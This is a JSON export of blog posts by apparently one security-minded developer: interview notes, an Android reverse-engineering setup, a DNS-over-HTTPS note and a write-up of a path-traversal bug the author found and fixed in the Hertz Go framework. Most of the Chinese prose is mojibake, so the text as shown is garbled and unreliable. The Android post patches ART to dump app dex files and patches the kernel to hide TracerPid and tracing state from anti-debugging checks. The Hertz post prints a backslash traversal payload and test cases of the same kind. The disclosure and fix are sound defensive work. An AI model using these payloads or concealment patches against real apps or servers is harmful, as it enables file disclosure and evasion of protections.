[{"content":"å¯ä»¥è¯´éå¸¸å¹¸è¿äº†ï¼Œæ‹¿äº†ç¾å›¢å’Œå®æ³¢é“¶è¡Œçš„offerï¼Œæœ€åå»äº†ç¾å›¢ã€‚\nçŸ¥ä¹ å››äº”ååˆ†é’Ÿçš„æ ·å­ï¼Œä¸€é¢æŒ‚\nçº¿ç¨‹å’Œåç¨‹\nåç¨‹é™¤è°ƒåº¦å¤–ä¼˜åŠ¿\nrpc é‰´æƒåœ¨å“ªåš gRPCæ‹¦æˆªå™¨\ngmp\npperf\nå››æ¬¡æŒ¥æ‰‹\ninnodbç´¢å¼•\nredis\nç¼“å­˜å¤±æ•ˆ\nå¿«æ’\nç™¾åº¦å¥åº· ä¸€ä¸ªåŠå°æ—¶ã€ä¸€é¢æŒ‚\nè¯„ä»·å’Œå»ºè®®ï¼šæ•°æ®åº“å¹¶ä¸äº†è§£ï¼Œä¸šåŠ¡ç”¨æ•°æ®åº“å¤šä¸ç¬¦åˆï¼Œæ²Ÿé€šä¸ç›´æ¥ã€ç»†åŒ–\nè°ˆè°ˆé¡¹ç›®\nå¦‚ä½•å®ç°åˆ†å¸ƒå¼\næ¶ˆæ¯é˜Ÿåˆ—æœ‰å•¥ç”¨\né™æµçš„å¸¸ç”¨æ–¹æ³•\nçˆ¬è™«æ€ä¹ˆé€†çš„ ä»å®‰å…¨è§’åº¦è¯´è¯´ç½‘ç«™æœ‰ä»€ä¹ˆä¸è¶³\nè°ˆè°ˆæ¯”èµ›\nraftæ€ä¹ˆå®ç°ä¸€è‡´æ€§\nmapreduceä¸ºä»€ä¹ˆè¦map å¦‚æœæ˜¯æ•°ç»„è¿˜éœ€è¦mapå—\nmysqlæƒé™éš”ç¦»\nè¯´è¯´QUICå’ŒHTTP3\nginæ€ä¹ˆå®ç°middleware\nä»€ä¹ˆæ ·çš„è¯­è¨€å¯ä»¥å®ç°middleware(æœ‰ä»€ä¹ˆç‰¹æ€§) ç­”ï¼šæœ‰æ•°ç»„å’Œå‡½æ•°æŒ‡é’ˆéƒ½å¯ä»¥\nrpcæ€ä¹ˆæ€ä¹ˆæš´éœ²æ¥å£\nlinuxå‘½ä»¤ï¼š\næ–‡ä»¶å¤¹å¤§å°ã€å¤§å°human readableã€\næŸ¥çœ‹ç«¯å£\nnetstat -anoä¸­næ˜¯ä»€ä¹ˆæ„æ€ \u0026ndash;numericä¸è§£æåŸŸå\nè¯´è¯´ä¸¤ä¸ªCVE é™æ€ç›®å½•æŒ‡å®šrootå°±è®¿é—®ä¸åˆ°äº†å§\nHTTPS\næ²¡æœ‰CAè¡Œå—\nCAä¿æŠ¤è°\nå†…å­˜ç®¡ç† TLB\nç®—æ³•ï¼šäºŒå‰æ ‘å…¬å…±çˆ¶èŠ‚ç‚¹\nç¾å›¢å®‰å…¨ç ”å‘ 22å·ä¸€é¢ã€23å·äºŒé¢ã€24å·ä¸‰é¢ã€27å·å››é¢ã€29å·hré¢ ä¸€å°æ—¶åOC å½“æ™šOffer mail\nä¸€äºŒé¢è®°ä¸å¤ªæ¸…äº†\nä¸€é¢ äº”ååˆ†é’Ÿå·¦å³\nè‡ªæˆ‘ä»‹ç»\nstatic å˜é‡ å‡½æ•°\næ€ä¹ˆæ€ç¨‹åº\nçº¿ç¨‹åç¨‹åŒºåˆ«\nçº¿ç¨‹æ±  åç¨‹æ± \nå †å†…å­˜è¿˜æ˜¯æ ˆå†…å­˜\ngo gmp\ngo gc\nè‡ªå·±å®ç°gcæ€è·¯\nhttps\nclient hello\né¡¹ç›®\nç®—æ³•ï¼šé“¾è¡¨ä¸¤ä¸¤æ‰“åŒ…ç¿»è½¬\nåé—®\näºŒé¢ å››ååˆ†é’Ÿå·¦å³\nè‡ªæˆ‘ä»‹ç»\nnetpollé«˜æ€§èƒ½ç½‘ç»œåº“\nè¿˜æœ‰ä»€ä¹ˆä¼˜åŒ–ç©ºé—´\neBPFå¯ä»¥ä¼˜åŒ–å—\né›¶æ‹·è´\nQUICå’ŒHTTP3\nHTTPS\nAESå®ç°\nä¸­é—´äºº\nTCPæ¡æ‰‹å¯ä»¥ä¼ é€’ä¿¡æ¯å—\nç”¨eBPFå¯ä»¥å—\næ”¹äº†ä¹‹åè¿˜èƒ½æ­£å¸¸æ¡æ‰‹å—\ngoå†™è¿‡çš„é¡¹ç›®\nçˆ¬è™« åçˆ¬ é€†å‘ è§£å¯†\nå¦‚ä½•æ•è·æ¶æ„æµé‡\nå¦‚ä½•åˆ†ææ¶æ„æµé‡\né—®ä¸€é¢æƒ…å†µ\nåé—®\nèŒä¸šå»ºè®®\nä¸‰é¢ äº”ååˆ†é’Ÿå·¦å³\nè‡ªæˆ‘ä»‹ç»\nQUICå’Œhttp3ä»‹ç»ä¸€ä¸‹\næœ€ç»ˆè¡¡é‡æ ‡å‡†å’Œæ€§èƒ½æŒ‡æ ‡æ€ä¹ˆæ ·\ngoå†™è¿‡çš„é¡¹ç›®\nä»‹ç»ä¸‹åˆ†å¸ƒå¼ç³»ç»Ÿ\nCAPç†è®º\nraftä¸­CAPçš„å–èˆ\nraftå®ç°\nè¿˜æœ‰ä»€ä¹ˆåˆ†å¸ƒå¼åè®®ï¼ˆç­”paxosï¼‰\nä½¿ç”¨åœºæ™¯ï¼ˆetcdã€TIDBï¼‰\njavaå†™è¿‡æ²¡ï¼ˆæ²¡æœ‰ï¼‰\nzookeeperå‘¢ï¼ˆä»‹ç»ä¸€ä¸‹ï¼ŒZABåè®®ï¼‰\nè¯­è¨€ï¼ŒèŒä¸šè§„åˆ’ï¼Œæƒ³åšä»€ä¹ˆï¼ˆGoã€Rustï¼‰\nlibpcapå’Œtcpdumpå®ç°\nå†…æ ¸ç½‘ç»œæ ˆç½‘ç»œæµé‡èµ°å‘\niptableså®ç°\næ¶æ„ç½‘ç»œæµé‡åˆ†æ\neBPFæ¶æ„ç¨‹åºæ€è·¯\næŒ‚è½½ç‚¹ XDPã€TCé€‰ç”¨é—®é¢˜\nåé—®\nå»ºè®®ï¼šå…³æ³¨ç»“æœ è¡¡é‡æ ‡å‡† æ€§èƒ½æŒ‡æ ‡ äº§å‡ºç»“æœ\nä»‹ç»éƒ¨é—¨å’Œå·¥ä½œï¼Œé—®æƒ³å»å“ª\nå››é¢ ä¸‰åäº”åˆ†é’Ÿ\nè‡ªæˆ‘ä»‹ç»\nä¸ºä»€ä¹ˆè¯»netéƒ¨åˆ†å†…æ ¸\nè¯»å†…æ ¸å’Œæºç æ„Ÿæ‚Ÿ\nè¯»ä»€ä¹ˆä¹¦\nå››æ¬¡æŒ¥æ‰‹å¸¦åºåˆ—å·\nè¯´è¯´è€ƒç ”\nè¿˜æœ‰å‡†å¤‡åˆ«çš„æ‹›è˜å—\nquicå’Œhttp3å®ç°ä»‹ç»\neBPFé¡¹ç›®ä»‹ç»\nç®—æ³•ï¼šå¿«æ’\nåé—®\nhré¢ äºŒåäº”åˆ†é’Ÿ\nhrè‡ªæˆ‘ä»‹ç»\nè‡ªæˆ‘ä»‹ç»\nä¹‹å‰å¹²å˜›å»äº†\næ‰‹é‡Œæœ‰å“ªäº›offer\nä¸ªäººæ„å‘å¦‚ä½•\nè¿˜åœ¨åŒæ—¶é¢å“ªäº›å…¬å¸ ä»€ä¹ˆè¿›åº¦\nè€ƒç ”å·¥ä½œé€‰æ‹©ã€å­¦å†çœ‹å¾…\nå­¦é™¢æ˜¯ä¸ªä»€ä¹ˆæƒ…å†µ\nå­¦æ ¡åŒå­¦éƒ½æ˜¯å¹²å˜›çš„\näººç”Ÿå½±å“è¾ƒå¤§çš„äº‹\nå¦‚ä½•å®‰æ’å­¦ä¹ å’Œæ—¶é—´\næ¯”èµ›ä¸­çš„è§’è‰²\næ¯”èµ›æ”¶è·æ˜¯ä»€ä¹ˆ\né˜Ÿå‹å»å‘æ˜¯ä»€ä¹ˆ\nå²—ä½æ˜¯å¦äº†è§£\nåé—®\nå®æ³¢é“¶è¡Œ åˆ†æˆä¸‰é¢ï¼šä¸€é¢æŠ€æœ¯é¢ã€äºŒé¢è¡Œæ”¿é¢ã€ä¸‰é¢ç»ˆé¢\næˆ‘å¥½åƒæ˜¯æœ€åä¸€æ‰¹ä»–ä»¬èµ¶è¿›åº¦ç›´æ¥ä¸€é¢äºŒé¢ä¸€èµ·äº†\nä¸€é¢ åªæœ‰äº”åˆ°ååˆ†é’Ÿ\næ¯”èµ›èƒ½åšå¤šå°‘é¢˜\nCVEä¸ºä»€ä¹ˆåˆ†æ•°è¿™ä¹ˆé«˜\nSQLæ³¨å…¥æ”»å‡»ä¸é˜²å¾¡\nååºåˆ—åŒ–æ”»å‡»ä¸é˜²å¾¡\nç»ˆé¢ è¾©è®ºï¼š\nç§‘æŠ€èµ‹èƒ½é‡‘èè½¬å‹äº§å“é‡è¦è¿˜æ˜¯ä¼ä¸šé‡è¦\nè‡ªç”±è¾©è®ºå‡ ä¸ªäººå°±æ˜¯å‡ åˆ†é’Ÿï¼Œè¾©è®ºç»“æŸåŒæ–¹æ€»ç»“é™ˆè¯\nä¹‹åé¢è¯•å®˜æŒ‘å‡ ä¸ªäººé—®é—®é¢˜ï¼Œæˆ‘å’ŒäºŒå·æ˜¯å®‰å…¨æŠ€æœ¯çš„ï¼Œæ²¡æœ‰è¢«é—®åˆ°é—®é¢˜ï¼Œå…¶ä»–çš„éƒ½è¢«é—®äº†è‡³å°‘ä¸€ä¸ªé—®é¢˜ï¼Œè¿˜æœ‰çš„åŒå­¦æŠ“ç€é—®äº†ä¸‰å››ä¸ªé—®é¢˜ã€‚æ®è¯´ä¸è¢«é—®å°±æ˜¯ç¨³äº†ã€‚\n","description":"","id":3,"section":"posts","tags":["æ—¥å¸¸"],"title":"2023æ˜¥æ‹›é¢ç»","uri":"https://ruokeqx.gitee.io/posts/2023spring_interview/"},{"content":"ä¿®æ”¹å†…æ ¸å‚æ•° 1 2 3 4 5 $ cat device/motorola/berlin/BoardConfig.mk | grep TARGET_KERNEL_CONFIG TARGET_KERNEL_CONFIG += vendor/lineage_berlin.config $ cat device/motorola/sm7325-common/BoardConfigCommon.mk | grep TARGET_KERNEL_CONFIG TARGET_KERNEL_CONFIG := vendor/lahaina-qgki_defconfig vendor/lineage_moto-lahaina.config $ vim /mnt/android/lineage/kernel/motorola/sm7325/arch/arm64/configs/vendor/lineage_berlin.config æ‰‹åŠ¨æ›´æ–°å†…æ ¸ï¼ˆPatch commitï¼‰ 1 2 3 4 5 $ git remote add linux-stable https://mirrors.bfsu.edu.cn/git/linux-stable.git $ git fetch linux-stable # æŸ¥çœ‹å“ªäº›åˆ†æ”¯å­˜åœ¨commitID $ git branch -r --contains 358fdb4 $ git cherry-pick -m 1 358fdb4 ä¿®æ”¹å®‰å“æºç dump dex 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // libdexfile/dex/dex_file_loader.cc #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; ... std::unique_ptr\u0026lt;DexFile\u0026gt; DexFileLoader::OpenCommon(const uint8_t* base, size_t size, const uint8_t* data_base, size_t data_size, const std::string\u0026amp; location, uint32_t location_checksum, const OatDexFile* oat_dex_file, bool verify, bool verify_checksum, std::string* error_msg, std::unique_ptr\u0026lt;DexFileContainer\u0026gt; container, VerifyResult* verify_result) { ...... // file char buf[256]; char out[256]; strcpy(buf, \u0026#34;/data/data/\u0026#34;); int fd = open(\u0026#34;/proc/self/cmdline\u0026#34;, O_RDONLY); size_t readsize = read(fd,\u0026amp;buf[11],sizeof(buf)-11); buf[11+readsize]=\u0026#39;\\0\u0026#39;; close(fd); strcat(buf, \u0026#34;/ruokeqx\u0026#34;); if(!access(buf, F_OK)){ sprintf(out, \u0026#34;%s/%x_dex\u0026#34;,buf,*(uint32_t*)(base+8)); int fd_out = open(out, O_WRONLY | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); readsize = write(fd_out, base, size); close(fd_out); } return dex_file; } ä¿®æ”¹å†…æ ¸åè°ƒè¯•æ ‡å¿—ä½ ä¿®æ”¹Stateå­—æ®µå’ŒTracerPidå­—æ®µ\nå°†åŸæ¥çŠ¶æ€è¡¨ä¸­çš„Tå’Œtéƒ½ä¿®æ”¹ä¸ºSè¿™æ ·å°±é¿å…äº†è¯¥çŠ¶æ€ä½åæ˜ å‡ºè¢«ç›‘æµ‹çš„çŠ¶æ€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 // fs/proc/array.c static const char * const task_state_array[] = { \u0026#34;R (running)\u0026#34;,\t/* 0 */ \u0026#34;S (sleeping)\u0026#34;,\t/* 1 */ \u0026#34;D (disk sleep)\u0026#34;,\t/* 2 */ // \u0026#34;T (stopped)\u0026#34;,\t/* 4 */ \u0026#34;S (sleeping)\u0026#34;,\t/* 4 */ // \u0026#34;t (tracing stop)\u0026#34;,\t/* 8 */ \u0026#34;S (sleeping)\u0026#34;,\t/* 8 */ \u0026#34;X (dead)\u0026#34;,\t/* 16 */ \u0026#34;Z (zombie)\u0026#34;,\t/* 32 */ }; static inline void task_state(struct seq_file *m, struct pid_namespace *ns, struct pid *pid, struct task_struct *p) { ... seq_put_decimal_ull(m, \u0026#34;\\nTgid:\\t\u0026#34;, tgid); seq_put_decimal_ull(m, \u0026#34;\\nNgid:\\t\u0026#34;, ngid); seq_put_decimal_ull(m, \u0026#34;\\nPid:\\t\u0026#34;, pid_nr_ns(pid, ns)); seq_put_decimal_ull(m, \u0026#34;\\nPPid:\\t\u0026#34;, ppid); // seq_put_decimal_ull(m, \u0026#34;\\nTracerPid:\\t\u0026#34;, tpid); seq_put_decimal_ull(m, \u0026#34;\\nTracerPid:\\t\u0026#34;, 0); seq_put_decimal_ull(m, \u0026#34;\\nUid:\\t\u0026#34;, from_kuid_munged(user_ns, cred-\u0026gt;uid)); seq_put_decimal_ull(m, \u0026#34;\\t\u0026#34;, from_kuid_munged(user_ns, cred-\u0026gt;euid)); seq_put_decimal_ull(m, \u0026#34;\\t\u0026#34;, from_kuid_munged(user_ns, cred-\u0026gt;suid)); seq_put_decimal_ull(m, \u0026#34;\\t\u0026#34;, from_kuid_munged(user_ns, cred-\u0026gt;fsuid)); seq_put_decimal_ull(m, \u0026#34;\\nGid:\\t\u0026#34;, from_kgid_munged(user_ns, cred-\u0026gt;gid)); seq_put_decimal_ull(m, \u0026#34;\\t\u0026#34;, from_kgid_munged(user_ns, cred-\u0026gt;egid)); seq_put_decimal_ull(m, \u0026#34;\\t\u0026#34;, from_kgid_munged(user_ns, cred-\u0026gt;sgid)); seq_put_decimal_ull(m, \u0026#34;\\t\u0026#34;, from_kgid_munged(user_ns, cred-\u0026gt;fsgid)); seq_put_decimal_ull(m, \u0026#34;\\nFDSize:\\t\u0026#34;, max_fds); ... } // fs/proc/base.c /* * Provides a wchan file via kallsyms in a proper one-value-per-file format. * Returns the resolved symbol. If that fails, simply return the address. */ static int proc_pid_wchan(struct seq_file *m, struct pid_namespace *ns, struct pid *pid, struct task_struct *task) { unsigned long wchan; char symname[KSYM_NAME_LEN]; wchan = get_wchan(task); if (wchan \u0026amp;\u0026amp; ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS) \u0026amp;\u0026amp; !lookup_symbol_name(wchan, symname)) // symnameä¸­æœ‰traceå°±æ”¹æˆsys_epoll_wait if (strstr(symname, \u0026#34;trace\u0026#34;)) seq_printf(m, \u0026#34;%s\u0026#34;, \u0026#34;sys_epoll_wait\u0026#34;); else seq_printf(m, \u0026#34;%s\u0026#34;, symname); else seq_putc(m, \u0026#39;0\u0026#39;); return 0; } Ref https://appuals.com/how-to-update-your-android-kernel-to-latest-linux-stable/\nhttps://github.com/gojue/ecapture/discussions/308\nhttps://www.freebuf.com/articles/terminal/166307.html\nhttps://xz.aliyun.com/t/4897\n","description":"","id":4,"section":"posts","tags":["security"],"title":"æ‰“é€ å®‰å“è°ƒè¯•ç¯å¢ƒ","uri":"https://ruokeqx.gitee.io/posts/android_kernel_modify/"},{"content":"å†å²æ˜¯ä¸Šå‡çš„èºæ—‹ã€äººç”Ÿäº¦æ˜¯ã€‚\nåœ¨ç»å†ä¸€äº›äº‹æƒ…çš„æ—¶å€™ä¼šçªç„¶æƒ³é€šè¿‡å¾€çš„ä¸€äº›äº‹æƒ…ï¼Œé‚£ä¾¿å°†æœ¬æ–‡å‘½åä¸ºã€Šé†é†çŒé¡¶ã€‹å§ã€‚\næˆ–è®¸å°†æ¥çœ‹æ¥è¿™é‡Œè®°å½•çš„ä¸€äº›ä¸œè¥¿å¾ˆå¹¼ç¨šï¼Œä½†æ˜¯æˆ–è®¸äººå°±æ˜¯åœ¨ä¸€æ­¥æ­¥å¹¼ç¨šè¿ˆå‘æˆç†Ÿå§ã€‚\næŒç»­æ›´æ–°ing\n2022-09-15 å…¶å®è¿™ä¸ªé—®é¢˜ä¹‹å‰å¾ˆæ—©å°±çŸ¥é“äº† è¿™æ¬¡åªæ˜¯åˆé‡åˆ°äº†è¿™ä¸ªé—®é¢˜æ‰€ä»¥è®°å½•ä¸€ä¸‹\näº‹æƒ…å›å½’åˆ°ä¹‹å‰é¢å­—èŠ‚å®‰å…¨å®ä¹ ç”Ÿæ—¶é¢è¯•å®˜é—®çš„ä¸€ä¸ªé—®é¢˜\né—®ï¼šDNSæ˜¯åŸºäºUDPè¿˜æ˜¯åŸºäºTCP\nç­”ï¼šUDP\né—®ï¼šå¯ä»¥æ˜¯TCPå—\nç­”ï¼šä¸æ¸…æ¥šï¼ˆæƒ³çš„æ˜¯åº”è¯¥å¯ä»¥å§ï¼‰\nå½“æ—¶ç»“æŸåå»æŸ¥çš„æ—¶å€™çœ‹åˆ°çš„æ˜¯è¿™æ ·çš„\nè¾…åŸŸåæœåŠ¡å™¨å‘ä¸»åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢è¿›è¡Œæ•°æ®åŒæ­¥çš„æ—¶å€™ä¼šä½¿ç”¨TCPã€‚\nå…¶å®ä¹ŸæŒºæ²¡è¯´æœåŠ›çš„ï¼Œå¯¹è¾…åŸŸåæœåŠ¡å™¨å’Œä¸»åŸŸåæœåŠ¡å™¨å¦‚ä½•è¿è¡Œåè°ƒå®Œå…¨æ²¡æœ‰æ¦‚å¿µã€‚\nåæ¥çœ‹åˆ°äº†ï¼šRFC 8484 DNS Queries over HTTPS (DoH)\næ—¢ç„¶æ˜¯å®‰å…¨é¢è¯•ï¼Œæˆ‘æƒ³è¿™æ‰æ˜¯é¢è¯•å®˜æƒ³é—®çš„ç‚¹å§ï¼Œå¯æƒœæˆ‘å½“æ—¶å®Œå…¨ä¸çŸ¥é“ã€‚\nDNS over HTTPSï¼ˆç¼©å†™ï¼šDoHï¼‰æ˜¯ä¸€ä¸ªè¿›è¡Œå®‰å…¨åŒ–çš„åŸŸåè§£ææ–¹æ¡ˆã€‚å…¶æ„ä¹‰åœ¨äºä»¥åŠ å¯†çš„HTTPSåè®®è¿›è¡ŒDNSè§£æè¯·æ±‚ï¼Œé¿å…åŸå§‹DNSåè®®ä¸­ç”¨æˆ·çš„DNSè§£æè¯·æ±‚è¢«çªƒå¬æˆ–è€…ä¿®æ”¹çš„é—®é¢˜ï¼ˆä¾‹å¦‚ä¸­é—´äººæ”»å‡»ï¼‰æ¥è¾¾åˆ°ä¿æŠ¤ç”¨æˆ·éšç§çš„ç›®çš„ã€‚\nwikiä¸Šè®²çš„æŒºå¥½çš„ https://zh.m.wikipedia.org/zh-hans/DNS_over_HTTPS\næ€»çš„æ¥è¯´å°±æ˜¯DNS over UDP-\u0026gt;DNSSEC-\u0026gt;DNS over HTTPSçš„é˜²æ­¢æŠ•æ¯’æ±¡æŸ“é˜²æ­¢ç›‘å¬çš„æ”¹è¿›è¿‡ç¨‹å§ã€‚\nå†åé¢äº†è§£QUICçš„æ—¶å€™åˆå‘ç°äº†æœ‰ï¼šRFC 9250 DNS over Dedicated QUIC Connections\n","description":"","id":5,"section":"posts","tags":["æ—¥å¸¸"],"title":"é†é†çŒé¡¶","uri":"https://ruokeqx.gitee.io/posts/%E9%86%8D%E9%86%90%E7%81%8C%E9%A1%B6/"},{"content":"æ¼æ´åŠä¿®å¤ å…ˆä¸Šé“¾æ¥\nhttps://github.com/cloudwego/hertz/issues/228\nhttps://github.com/cloudwego/hertz/pull/229\nèµ·å› æ˜¯æ˜¨æ™šç¡å‰çœ‹åˆ°hertz issueåˆ—è¡¨æœ‰ä¸€ä¸ªé»˜è®¤é€šè¿‡XFFè·å–ClientIPçš„æ¼æ´ï¼Œè¿™å¾ˆå®¹æ˜“è¢«ä¼ªé€ ã€‚Issueä¸­æåŠGinç¤¾åŒºçš„ç›¸ä¼¼è®¨è®ºï¼ˆé‚£å«ä¸€ä¸ªæ··ä¹±ä¸ç²¾å½©ï¼‰ã€‚ç„¶åæˆ‘æƒ³ç€çœ‹çœ‹ä¼šè¢«ä¼šæœ‰å•¥åˆ«çš„æ¼æ´ã€‚\nç”±äºä¹‹å‰å°±çœ‹è¿‡å¤šä¸ªhttpæ¡†æ¶çš„æºç ï¼Œå¹¶ä¸”ä¹‹å‰2022Bytecampçš„é¡¹ç›®å°±æ˜¯hertzæ·»åŠ QUICå’ŒHTTP3æ”¯æŒï¼Œæ‰€ä»¥æˆ‘å¯¹hertzæºç å¯ä»¥è¯´æ˜¯ååˆ†äº†è§£äº†ã€‚\nhttpæ¡†æ¶å¸¸è§„çš„æ¼æ´å®¡è®¡æ€è·¯å°±æ˜¯æ–‡ä»¶ã€æ¨¡æ¿ã€è·¯ç”±è¿™å‡ ä¸ªç‚¹ï¼Œæˆ‘è¿™æ¬¡å°±æ˜¯ä¸Šæ¥ç›´å¥”æ–‡ä»¶å»çš„ã€‚\nåœ¨fsçš„handleRequestæ–¹æ³•ä¸­æ³¨é‡Šå¯ä»¥çœ‹åˆ°ctx.Path()è·å–çš„pathæ˜¯ç»è¿‡normalizeçš„ï¼Œæ‰¾äº†ä¸€ä¸‹æœ‰ä¸ªnormalizePathå‡½æ•°ï¼Œé‡Œé¢å¯¹pathå¤šäº†å¤šæ­¥å¤„ç†å¯ä»¥è¯´ååˆ†å®Œå–„ã€‚æˆ‘è§‰å¾—ä»£ç å†™çš„æœ‰ä¸€å®šå€Ÿé‰´æ„ä¹‰ï¼Œæ‰€ä»¥æ‘˜å–å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 func normalizePath(dst, src []byte) []byte { dst = dst[:0] dst = addLeadingSlash(dst, src) dst = decodeArgAppendNoPlus(dst, src) // remove duplicate slashes b := dst bSize := len(b) for { n := bytes.Index(b, bytestr.StrSlashSlash) if n \u0026lt; 0 { break } b = b[n:] copy(b, b[1:]) b = b[:len(b)-1] bSize-- } dst = dst[:bSize] // remove /./ parts b = dst for { n := bytes.Index(b, bytestr.StrSlashDotSlash) if n \u0026lt; 0 { break } nn := n + len(bytestr.StrSlashDotSlash) - 1 copy(b[n:], b[nn:]) b = b[:len(b)-nn+n] } // remove /foo/../ parts for { n := bytes.Index(b, bytestr.StrSlashDotDotSlash) if n \u0026lt; 0 { break } nn := bytes.LastIndexByte(b[:n], \u0026#39;/\u0026#39;) if nn \u0026lt; 0 { nn = 0 } n += len(bytestr.StrSlashDotDotSlash) - 1 copy(b[nn:], b[n:]) b = b[:len(b)-n+nn] } // remove trailing /foo/.. n := bytes.LastIndex(b, bytestr.StrSlashDotDot) if n \u0026gt;= 0 \u0026amp;\u0026amp; n+len(bytestr.StrSlashDotDot) == len(b) { nn := bytes.LastIndexByte(b[:n], \u0026#39;/\u0026#39;) if nn \u0026lt; 0 { return bytestr.StrSlash } b = b[:nn+1] } return b } æœ¬æ¥æ˜¯æ„Ÿè§‰ååˆ†å®Œå–„ä¸å¯èƒ½æœ‰æ¼æ´ï¼Œæœ€å…³é”®çš„ä¸€æ­¥æ˜¯æ‰“ä¸‹æ–­ç‚¹debugå¯åŠ¨ consoleè¾“å‡ºpathå¹¶ä¸”burp repeaterä¸æ–­å°è¯•\n/../ä¼šè¢«è¿‡æ»¤/./ä¼šè¢«åˆ é™¤ ä½†æ˜¯åœ¨æµ‹è¯•ä¸­ \\..\\è¿˜æ˜¯æ­£å¸¸æ˜¾ç¤ºï¼Œç„¶åå°±è‡ªç„¶æƒ³åˆ°windows fså¯ä»¥\\..\\è®¿é—® ä¾¿æ‰¾åˆ°äº†æ¼æ´ã€‚\næœ€ç»ˆçš„ä¿®å¤æ–¹æ¡ˆä¹Ÿååˆ†ç®€å• å°±æ˜¯æŠŠæ‰€æœ‰åæ–œæ æ›¿æ¢æˆæ­£æ–œæ å³å¯ã€‚\nç¬¬ä¸€ç‰ˆä¿®æ”¹å¦‚ä¸‹ ä½†æ˜¯ä¼šå­˜åœ¨å·²ä¿®æ”¹æ•°æ®é‡å¤åˆ¤æ–­é—®é¢˜ï¼Œè€Œä¸”å‡½æ•°å¯¹åŸæœ‰srcè¿›è¡Œä¿®æ”¹å­˜åœ¨äº‰è®®ï¼Œæ­¤å¤–è¿˜æœ‰æ”»å‡»é¢127.0.0.0:8888/..%5c..%5cgo.sum è¿™ä¸ªæ”»å‡»å¯ä»¥æˆåŠŸæ˜¯å› ä¸ºsrcçš„åæ–œæ urlencodeäº†æ²¡æœ‰æ›¿æ¢æ‰ åç»­decodeArgAppendNoPlusä¼šurldecodeç„¶åäº¤ç”±openå‡½æ•°/..\\..\\go.sum æ‰€ä»¥ä»»ç„¶æ”»å‡»æˆåŠŸ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func normalizePath(dst, src []byte) []byte { // replace all backslashes with forward slashes for { n := bytes.Index(src, bytestr.StrBackSlash) if n \u0026lt; 0 { break } src[n] = \u0026#39;/\u0026#39; } dst = dst[:0] dst = addLeadingSlash(dst, src) dst = decodeArgAppendNoPlus(dst, src) ... } ç¬¬äºŒç‰ˆä¿®æ”¹å¦‚ä¸‹ï¼Œé¿å…ä¸Šæ–‡è¯´åˆ°å­˜åœ¨çš„é—®é¢˜ã€‚æ•™è®­æ˜¯è¿‡æ»¤è¦å°½é‡é è¿‘å‡½æ•°returnå¤„æˆ–è€…å±é™©å‡½æ•°ç‚¹(æ­¤å¤„æ˜¯returnåäº¤ç”±fsçš„openå‡½æ•°)ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func normalizePath(dst, src []byte) []byte { dst = dst[:0] dst = addLeadingSlash(dst, src) dst = decodeArgAppendNoPlus(dst, src) // replace all backslashes with forward slashes if filepath.Separator == \u0026#39;\\\\\u0026#39; { for i := range dst { if dst[i] == \u0026#39;\\\\\u0026#39; { dst[i] = \u0026#39;/\u0026#39; } } } ... } å•æµ‹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func TestParsePath(t *testing.T) { t.Parallel() testParsePath(t, \u0026#34;/../../../../../foo\u0026#34;, \u0026#34;/foo\u0026#34;) testParsePath(t, \u0026#34;/..\\\\..\\\\..\\\\..\\\\..\\\\foo\u0026#34;, \u0026#34;/foo\u0026#34;) testParsePath(t, \u0026#34;/..%5c..%5cfoo\u0026#34;, \u0026#34;/foo\u0026#34;) } func testParsePath(t *testing.T, path, expectedPath string) { var u URI u.Parse(nil, []byte(path)) parsedPath := u.Path() if string(parsedPath) != expectedPath { t.Fatalf(\u0026#34;Unexpected Path: %q. Expected %q\u0026#34;, parsedPath, expectedPath) } } æ€ä¹ˆè¯´å‘¢ æœ‰æ—¶å€™å†™ä»£ç çœŸçš„å¾—å¤šæƒ³ä¸€ç‚¹å¹¶ä¸”æ­é…ä¸€å®šçš„æµ‹è¯•ï¼Œä¸Šæ–‡è¯´IndexByteä¼šå­˜åœ¨é‡å¤åˆ¤æ–­çš„é—®é¢˜ï¼Œä½†æ˜¯ä¹Ÿå­˜åœ¨SIMDçš„ä¼˜åŒ–ï¼Œæœ€ç»ˆæµ‹è¯•ä¸‹æ¥åœ¨æœ‰åæ–œæ çš„æƒ…å†µä¸‹IndexByteç¡®å®æ€§èƒ½ä¸å¦‚for-rangeï¼Œä½†æ˜¯æ²¡æœ‰åæ–œæ çš„æƒ…å†µä¸‹å› ä¸ºç¬¬ä¸€æ¬¡IndexByteå°±ä¼šbreakæ‰€ä»¥æ€§èƒ½ä¼šæ›´åŠ ï¼Œè¯¦æƒ…è§pr commentã€‚\nè¿˜æœ‰å°±æ˜¯UTåœ¨æœ¬åœ°è·‘é€šè¿‡ä½†æ˜¯æ²¡æœ‰åœ¨github actionè·‘é€šï¼Œå› ä¸ºlinuxä¸ä¼šå¯¹åæ–œæ è¿›è¡Œæ›¿æ¢ã€‚æœ€ç»ˆç‰ˆæœ¬UTå¦‚ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func TestParsePathWindows(t *testing.T) { t.Parallel() testParsePathWindows(t, \u0026#34;/../../../../../foo\u0026#34;, \u0026#34;/foo\u0026#34;) testParsePathWindows(t, \u0026#34;/..\\\\..\\\\..\\\\..\\\\..\\\\foo\u0026#34;, \u0026#34;/foo\u0026#34;) testParsePathWindows(t, \u0026#34;/..%5c..%5cfoo\u0026#34;, \u0026#34;/foo\u0026#34;) } func testParsePathWindows(t *testing.T, path, expectedPath string) { var u URI u.Parse(nil, []byte(path)) parsedPath := u.Path() if filepath.Separator == 